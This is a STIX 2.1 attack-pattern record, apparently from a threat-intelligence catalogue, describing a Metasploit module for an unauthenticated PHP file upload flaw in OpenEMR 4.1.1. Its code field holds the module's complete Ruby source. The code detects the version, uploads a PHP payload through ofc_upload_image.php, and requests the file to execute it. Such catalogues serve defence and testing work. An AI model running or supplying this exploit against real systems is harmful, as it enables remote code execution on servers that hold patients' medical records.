{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--468be23d-c6af-4c71-8353-c55f0dff8642",
    "created": "2024-08-14T17:13:23.811688Z",
    "modified": "2024-08-14T17:13:23.811692Z",
    "name": "\"OpenEMR PHP File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in OpenEMR 4.1.1 By abusing the ofc_upload_image.php file from the openflashchart library, a malicious user can upload a file to the tmp-upload-images directory without any authentication, which results in arbitrary code execution. The module has been tested successfully on OpenEMR 4.1.1 over Ubuntu 10.04.  'License'        => MSF_LICENSE 'Notes' => { 'Stability' => [CRASH_SAFE] 'SideEffects' => [] 'Reliability' => [] ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/openemr_upload_exec.rb",
            "external_id": "openemr_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4140"
        },
        {
            "source_name": "reference",
            "url": "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5126.php"
        },
        {
            "source_name": "reference",
            "url": "http://www.open-emr.org/wiki/index.php/OpenEMR_Patches"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"OpenEMR PHP File Upload Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in OpenEMR 4.1.1 By abusing the\n        ofc_upload_image.php file from the openflashchart library, a malicious user can\n        upload a file to the tmp-upload-images directory without any authentication, which\n        results in arbitrary code execution. The module has been tested successfully on\n        OpenEMR 4.1.1 over Ubuntu 10.04.\n      },\n      'License'        => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => []\n      },\n      'Author'         =>\n        [\n          'Gjoko Krstic <gjoko[at]zeroscience.mk>', # Discovery, PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4140' ],\n          [ 'OSVDB', '90222' ],\n          [ 'BID', '37314' ],\n          [ 'EDB', '24492' ],\n          [ 'URL', 'http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5126.php' ],\n          [ 'URL', 'http://www.open-emr.org/wiki/index.php/OpenEMR_Patches' ]\n        ],\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['OpenEMR 4.1.1', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-02-13',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to EGallery', '/openemr'])\n        ])\n  end\n\n  def check\n    uri = target_uri.path\n    peer = \"#{rhost}:#{rport}\"\n\n    # Check version\n    vprint_status(\"Trying to detect installed version\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"interface\", \"login\", \"login.php\")\n    })\n\n    if res and res.code == 200 and res.body =~ /v(\\d\\.\\d\\.\\d)/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Version #{version} detected\")\n\n    if version > \"4.1.1\"\n      return Exploit::CheckCode::Safe\n    end\n\n    # Check for vulnerable component\n    vprint_status(\"Trying to detect the vulnerable component\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(\"#{uri}\", \"library\", \"openflashchart\", \"php-ofc-library\", \"ofc_upload_image.php\"),\n    })\n\n    if res and res.code == 200 and res.body =~ /Saving your image to/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    uri = target_uri.path\n\n    peer = \"#{rhost}:#{rport}\"\n    payload_name = rand_text_alpha(rand(10) + 5) + '.php'\n    my_payload = payload.encoded\n\n    print_status(\"Sending PHP payload (#{payload_name})\")\n    res = send_request_raw({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(\"#{uri}\", \"library\", \"openflashchart\", \"php-ofc-library\", \"ofc_upload_image.php\") + \"?name=#{payload_name}\",\n      'headers' => { \"Content-Length\" => my_payload.length.to_s },\n      'data'    => my_payload\n    })\n\n    # If the server returns 200 and the body contains our payload name,\n    # we assume we uploaded the malicious file successfully\n    if not res or res.code != 200 or res.body !~ /Saving your image to.*#{payload_name}$/\n      fail_with(Failure::NotVulnerable, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    register_file_for_cleanup(payload_name)\n\n    print_status(\"Executing PHP payload (#{payload_name})\")\n    # Execute our payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(\"#{uri}\", \"library\", \"openflashchart\", \"tmp-upload-images\", payload_name),\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.  Print the status code for debugging purposes.\n    if res and res.code != 200\n      print_error(\"Server returned #{res.code.to_s}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-13",
    "x_mitre_platforms": [
        "['php']"
    ]
}